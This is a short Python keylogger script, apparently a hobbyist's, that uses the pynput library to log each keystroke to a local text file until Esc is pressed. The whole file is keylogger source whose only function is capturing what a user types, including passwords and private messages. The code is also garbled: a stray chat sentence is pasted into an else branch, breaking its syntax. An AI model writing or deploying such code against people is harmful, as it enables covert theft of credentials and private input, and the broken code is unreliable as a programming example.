from pynput.keyboard import Listener,Key

log_file = "keylogg.txt"

def on_press(key):
    with open(log_file,"a") as file:
        try:
            file.write(f"{key.char}\n")
        except AttributeError:
            if key == Key.space:
                file.write(f"[SPACE]\n")
            elif key ==  Key.enter:
                file.write(f"\n")
            else:hi i made a key logger in python 
                file.write(f"{key}\n")

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
                

